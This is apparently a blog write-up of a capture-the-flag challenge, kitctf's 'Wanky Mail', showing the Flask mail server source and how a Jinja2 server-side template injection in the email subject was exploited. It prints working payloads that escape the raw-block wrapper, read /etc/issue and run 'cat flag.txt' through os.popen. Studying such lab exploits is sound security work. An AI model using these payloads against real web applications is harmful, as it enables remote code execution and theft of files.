---
layout: post
title:  "Template Injection Kitctf"
date:   2023-06-19 17:12:34 -0300
categories: [writeup]
tags: [writeup]
---


In this blog post, we will explore a specific template injection vulnerability discovered in a CTF (Capture The Flag) challenge from kitctf. We will delve into the details of the vulnerability. Let’s dive in!

> If you don’t know what is template injection, strong recoment that you visit the Burp labs https://portswigger.net/web-security/server-side-template-injection.

Brief introduction what is template injection. Template injection occurs when an application allows user-controlled input to be directly included in a template without proper sanitization or validation. This can lead to the execution of arbitrary code within the template context, potentially leading to remote code execution (RCE) or other critical security breaches.

### The challeger (Chall)
The chall was called “Wanky Mail”. Wanky Mail is a temporary mail server, which you could send and receive messages. The cool thing about kitctf is that they provide a Dockerfile for you to “build” the challenge on your machine, and also the source code!. Below is the code of the mail server:

```python
from flask import Flask, render_template_string, request, redirect, abort
from aiosmtpd.controller import Controller
from datetime import datetime
from base58 import b58decode, b58encode
import random 
import string
import os
from datetime import datetime
import queue

mails = {}
active_addr = queue.Queue(1000)

def format_email(sender, rcpt, body, timestamp, subject):
    return {"sender": sender, "rcpt": rcpt, 'body': body, 'subject': subject, "timestamp": timestamp}

def render_emails(address):
    id = 0
    render = """
    <table>
        <tr>
            <th id="th-left">From</th>
            <th>Subject</th>
            <th id="th-right">Date</th>
        </tr>
    """
    overlays = ""
    m = mails[address].copy()
    for email in m:

        render += f"""
        <tr id="{id}">
            <td>{email['sender']}</td>
            <td>{email['subject']}</td>
            <td>{email['timestamp']}</td>
        </tr>
        """
        overlays += f"""
        <div id="overlay-{id}" class="overlay">
            <div class="email-details">
                <h1>{email['subject']} - from: {email['sender']} to {email['rcpt']}</h1>
                <p>{email['body']}</p>
            </div>
        </div>
        """
        id +=1
    render += "</table>"
    render += overlays
    return render


def get_emails(id):
    with open('templates/index.html') as f:
        page = f.read()
        return page.replace('{{$}}', render_emails(id))

def log_email(session, envelope):
    print(f'{session.peer[0]} - - {repr(envelope.mail_from)}:{repr(envelope.rcpt_tos)}:{repr(envelope.content)}', flush=True)

def esc(s: str):
    return "{% raw %}" + s + "{% endraw %}"

class Handler:
     async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
        if not address.endswith(os.environ.get('HOSTNAME')):
             return '550 not relaying to that domain'
        envelope.rcpt_tos.append(address)
        print(address, flush=True)
        return '250 OK'

     async def handle_DATA(self, server, session, envelope):
        m = format_email(esc(envelope.mail_from), envelope.rcpt_tos[0], esc(envelope.content.decode()), datetime.now().strftime("%d-%m-%Y, %H:%M:%S"), "PLACEHOLDER")
        log_email(session, envelope)
        r = envelope.rcpt_tos[0]
        if not mails.get(r):
            if active_addr.full():
                mails.pop(active_addr.get())
            mails[r] = []
            active_addr.put(r)
        if len(mails[r]) > 10:
            mails[r].pop(0)
        mails[r].append(m)
        return '250 OK'

c = Controller(Handler(), "0.0.0.0")
c.start()


app = Flask(__name__)
@app.route('/')
def index():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(12))
    address = f"{username}@{os.environ.get('HOSTNAME', 'example.com')}"
    if not address in mails.keys():
        if active_addr.full():
            del mails[active_addr.get()]
        mails[address] = []
        active_addr.put(address)
    id = b58encode(address).decode()
    return redirect("/" + id)

@app.route('/<id>')
def mailbox(id):
    address = b58decode(id).decode()
    if not address in mails.keys():
        abort(404)    
    return render_template_string(get_emails(address), address=address)

if __name__ == '__main__':
    app.run()

```

### Analyzing the code
Analyzing the code we can identify that when sending an email to our temporary email, the code uses an escape function to render the email, as illustrated below:

```python
def esc(s: str):
    return "{% raw %}" + s + "{% endraw %}"

class Handler:
     async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
        if not address.endswith(os.environ.get('HOSTNAME')):
             return '550 not relaying to that domain'
        envelope.rcpt_tos.append(address)
        print(address, flush=True)
        return '250 OK'

     async def handle_DATA(self, server, session, envelope):
        m = format_email(esc(envelope.mail_from), envelope.rcpt_tos[0], esc(envelope.content.decode()), datetime.now().strftime("%d-%m-%Y, %H:%M:%S"), "PLACEHOLDER")
        log_email(session, envelope)
        r = envelope.rcpt_tos[0]
        if not mails.get(r):
            if active_addr.full():
                mails.pop(active_addr.get())
            mails[r] = []
            active_addr.put(r)
        if len(mails[r]) > 10:
            mails[r].pop(0)
        mails[r].append(m)
        return '250 OK'

c = Controller(Handler(), "0.0.0.0")
c.start()

```

So as you can see, in the code, every time someone sends an email, the “subject” and “content” fields execute the esc() function. To use the temporary email service, kitctf people provided some information to use the email server, to use the service, I made the following code in python to send emails using the smtplib library. As the following code demonstrates:


```python

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


sender_email = 'abx@kitctf.de'
receiver_email = 'abx@kitctf.de'
subject = 'pewpew'
message = 'pewpew'


msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))


smtp_server = 'mailserver-from-kitctf'
smtp_port = 8025

with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.sendmail(sender_email, receiver_email, msg.as_string())

```

The first step was to send a test code, in the subject field, with the objective of circumventing the esc() function, the payload {{7*7}} was used:

![](/images/kitctf-1.png)

![](/images/kitctf-2.png)

The next step was to try to run commands using the command 'incogbyte'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/issue').read():

![](/images/kitctf-3.png)

The next step was to execute the payload to list the files contained in the machine, the following payload was used {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}.

![](/images/kitctf-4.png)

![](/images/kitctf-5.png)

> All payloads had to be between {% endraw %} (% raw %}. Example: {% endraw %} {{ 7*7 }} {% raw %}, this was necessary to bypass the esc() function.

